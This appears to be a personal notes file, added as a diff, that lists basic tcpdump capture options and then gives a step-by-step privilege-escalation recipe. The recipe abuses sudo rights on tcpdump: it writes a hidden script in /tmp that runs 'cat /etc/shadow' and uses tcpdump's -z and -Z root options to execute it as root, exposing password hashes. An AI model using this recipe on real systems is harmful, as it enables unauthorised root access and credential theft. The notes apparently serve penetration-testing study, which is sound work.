@@ -1,0 +1,31 @@
+TCPDUMP
+Tcpdump
+
+
+man pcap-filter for filtering expressions
+
+tcpdump -i tap0 ---> to capture packets on interface tap0
+tcpdump -c 1 ----> captures one packet
+tcpdump -i tap0 -c 1 port 80 ---> packets on port 80
+tcpdump -i tap0 -c 1 tcp dst port 110 --> packet to dest tcp 110
+tcpdump -i tap0 -c 1 -X --> print the packet
+tcpdump -i tap0 -c 1 -X -s 1500 --> captures the full ip packet with 1500 bytes
+
+-d -dd -ddd ---> debuggin level
+
+
+
+=====================================
+
+1. We type sudo -l as our user and see /usr/sbin/tcpdump
+
+2. echo $'id\ncat /etc/shadow' > /tmp/.test
+
+3. chmod +x /tmp/.test
+
+4. sudo tcpdump -ln -i eth0  -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+5. And we will see it enter sniffing mode and BOOM we will get our data.
+
+
+
